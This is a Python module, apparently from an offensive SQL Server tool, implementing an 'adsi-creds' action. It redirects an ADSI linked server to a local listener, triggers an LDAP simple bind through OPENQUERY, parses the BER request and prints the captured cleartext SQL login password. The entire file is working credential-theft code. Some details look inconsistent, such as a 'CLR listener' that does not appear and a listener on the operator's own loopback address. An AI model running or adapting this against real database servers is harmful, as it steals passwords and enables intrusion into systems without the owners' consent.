# mssqlclient_ng/core/actions/domain/adsi_creds.py

# Built-in imports
import socket
import struct
import threading

# Third party imports
from loguru import logger

# Local library imports
from ..base import BaseAction, Arg
from ..factory import ActionFactory
from ...services.database import DatabaseContext
from ...services.adsi import AdsiService
from ...utils.common import generate_random_string

def _find_free_port() -> int:
    """Find an available TCP port."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("", 0))
        return s.getsockname()[1]

def _parse_ldap_simple_bind(data: bytes) -> tuple[str, str] | None:
    """
    Parse an LDAP simple bind request to extract username and password.
    LDAP simple bind sends credentials in cleartext.

    Returns:
        tuple of (username, password) or None if parsing fails
    """
    try:
        # LDAP message: SEQUENCE { messageID INTEGER, bindRequest APPLICATION[0] { ... } }
        # We need to parse enough BER/DER to extract the name and simple authentication fields
        offset = 0

        # Outer SEQUENCE tag
        if data[offset] != 0x30:
            return None
        offset += 1
        seq_len, offset = _parse_ber_length(data, offset)

        # messageID INTEGER
        if data[offset] != 0x02:
            return None
        offset += 1
        int_len, offset = _parse_ber_length(data, offset)
        offset += int_len

        # BindRequest APPLICATION[0] = 0x60
        if data[offset] != 0x60:
            return None
        offset += 1
        bind_len, offset = _parse_ber_length(data, offset)

        # version INTEGER
        if data[offset] != 0x02:
            return None
        offset += 1
        ver_len, offset = _parse_ber_length(data, offset)
        offset += ver_len

        # name OCTET STRING (the DN / username)
        if data[offset] != 0x04:
            return None
        offset += 1
        name_len, offset = _parse_ber_length(data, offset)
        username = data[offset : offset + name_len].decode("utf-8", errors="replace")
        offset += name_len

        # authentication CHOICE { simple [0] OCTET STRING }
        # Context-specific tag 0 = 0x80
        if data[offset] != 0x80:
            return None
        offset += 1
        pw_len, offset = _parse_ber_length(data, offset)
        password = data[offset : offset + pw_len].decode("utf-8", errors="replace")

        return (username, password)
    except (IndexError, ValueError):
        return None

def _parse_ber_length(data: bytes, offset: int) -> tuple[int, int]:
    """Parse a BER length field, returning (length, new_offset)."""
    b = data[offset]
    offset += 1
    if b < 0x80:
        return (b, offset)
    num_bytes = b & 0x7F
    length = int.from_bytes(data[offset : offset + num_bytes], "big")
    return (length, offset + num_bytes)

@ActionFactory.register(
    "adsi-creds",
    "Extract SQL login passwords via LDAP simple bind interception using a local CLR listener. Requires CONTROL SERVER or sysadmin.",
)
class AdsiCredentialExtractor(BaseAction):
    """
    Captures cleartext credentials via LDAP simple bind interception.

    Starts a local TCP listener that accepts an LDAP simple bind, then triggers
    an OPENQUERY against an ADSI linked server pointing at localhost. SQL Server
    performs the bind using the configured linked login credentials in cleartext.

    Requires sysadmin or CONTROL SERVER (to modify linked server data source).
    For unprivileged capture via an external listener, use adsi-redirect instead.

    Scenario A: Existing ADSI server with explicit linked login:
        The bind uses the configured linked login credentials.

    Scenario B: --temp flag to create a temporary useself=TRUE server:
        Captures the current SQL context's password (useful when landing
        as an unknown SQL login via a linked server chain).

    Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords
    """

    _target_server = Arg(position=0, default="", description="ADSI server name")
    _use_temporary_server = Arg(short_name="t", long_name="temp", default="", description="Use temporary server")

    def execute(self, database_context: DatabaseContext) -> tuple[str, str] | None:
        adsi_service = AdsiService(database_context)

        # Discover or validate target server
        if self._target_server:
            if not adsi_service.adsi_server_exists(self._target_server):
                logger.error(f"ADSI linked server '{self._target_server}' not found.")
                return None
            return self._extract_credentials(
                database_context, adsi_service, self._target_server
            )

        # Auto-discover existing ADSI servers
        existing = adsi_service.get_adsi_server_names()
        if existing:
            self._target_server = existing[0]
            logger.info(f"Found existing ADSI linked server: '{self._target_server}'")
            return self._extract_credentials(
                database_context, adsi_service, self._target_server
            )

        if not self._use_temporary_server:
            logger.warning("No existing ADSI linked server found.")
            logger.info(
                "Use --temp to create a temporary server and capture credentials"
            )
            logger.info("Use adsi-redirect <listener> if you lack CONTROL SERVER")
            return None

        # Create temporary server
        return self._extract_with_temporary_server(database_context, adsi_service)

    def _extract_with_temporary_server(
        self, database_context: DatabaseContext, adsi_service: AdsiService
    ) -> tuple[str, str] | None:
        """Create a temporary ADSI server, extract credentials, then cleanup."""
        server_name = f"ADSI_{generate_random_string(8)}"
        logger.info(f"Creating temporary ADSI server '{server_name}'")

        if not adsi_service.create_adsi_linked_server(server_name, "localhost"):
            logger.error("Failed to create temporary ADSI server.")
            return None

        try:
            return self._extract_credentials(
                database_context, adsi_service, server_name
            )
        finally:
            logger.info(f"Cleaning up temporary ADSI server '{server_name}'")
            try:
                adsi_service.drop_linked_server(server_name)
            except Exception as ex:
                logger.warning(f"Failed to cleanup temporary server: {ex}")

    def _extract_credentials(
        self,
        database_context: DatabaseContext,
        adsi_service: AdsiService,
        adsi_server: str,
    ) -> tuple[str, str] | None:
        """Extract credentials by intercepting LDAP simple bind."""

        if not database_context.user_service.is_admin():
            has_control = database_context.user_service.has_permission("CONTROL SERVER")
            if not has_control:
                logger.error("Requires sysadmin or CONTROL SERVER.")
                logger.info("Use adsi-redirect <listener> for unprivileged capture.")
                return None

        port = _find_free_port()
        credentials: list = []
        listener_ready = threading.Event()

        def _ldap_listener():
            """Simple TCP listener that captures one LDAP simple bind."""
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
                    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    srv.bind(("127.0.0.1", port))
                    srv.listen(1)
                    srv.settimeout(30)
                    listener_ready.set()

                    conn, addr = srv.accept()
                    with conn:
                        conn.settimeout(10)
                        data = conn.recv(4096)
                        if data:
                            result = _parse_ldap_simple_bind(data)
                            if result:
                                credentials.append(result)
            except Exception as ex:
                logger.debug(f"Listener error: {ex}")
            finally:
                listener_ready.set()

        # Start listener in background
        listener_thread = threading.Thread(target=_ldap_listener, daemon=True)
        listener_thread.start()
        listener_ready.wait(timeout=5)

        # Temporarily redirect the ADSI server's data source to localhost
        # Save original data source first
        original_ds = self._get_data_source(database_context, adsi_server)

        try:
            # Update data source to point at our listener
            self._set_data_source(database_context, adsi_server, f"localhost:{port}")

            # Fire the OPENQUERY to trigger the LDAP bind
            exploit_query = (
                f"SELECT * FROM OPENQUERY([{adsi_server}], "
                f"'SELECT * FROM ''LDAP://localhost:{port}'' ')"
            )

            logger.info("Triggering LDAP solicitation...")
            try:
                database_context.query_service.execute_non_processing(exploit_query)
            except Exception:
                pass  # Expected — LDAP query will fail but bind is captured

        finally:
            # Restore original data source
            if original_ds:
                self._set_data_source(database_context, adsi_server, original_ds)

        # Wait for listener to finish
        listener_thread.join(timeout=10)

        if credentials:
            username, password = credentials[0]
            logger.success("Credentials retrieved via LDAP simple bind")
            print(f"Username: {username}")
            print(f"Password: {password}")
            return (username, password)

        logger.warning("No credentials captured.")
        logger.info(
            "The connection may be using GSSAPI (Kerberos) instead of simple bind."
        )
        return None

    def _get_data_source(
        self, database_context: DatabaseContext, server_name: str
    ) -> str | None:
        """Get current data source for a linked server."""
        try:
            result = database_context.query_service.execute_scalar(
                f"SELECT data_source FROM sys.servers WHERE name = '{server_name}'"
            )
            return str(result) if result else None
        except Exception:
            return None

    def _set_data_source(
        self, database_context: DatabaseContext, server_name: str, data_source: str
    ) -> None:
        """Update the data source for a linked server."""
        try:
            database_context.query_service.execute_non_processing(
                f"EXEC master.dbo.sp_setnetname @server = '{server_name}', @netname = '{data_source}'"
            )
        except Exception:
            # Fallback: drop and recreate provider string
            try:
                database_context.query_service.execute_non_processing(
                    f"EXEC master.dbo.sp_addlinkedserver "
                    f"@server = '{server_name}', "
                    f"@srvproduct = 'Active Directory Service Interfaces', "
                    f"@provider = 'ADSDSOObject', "
                    f"@datasrc = '{data_source}'"
                )
            except Exception:
                pass
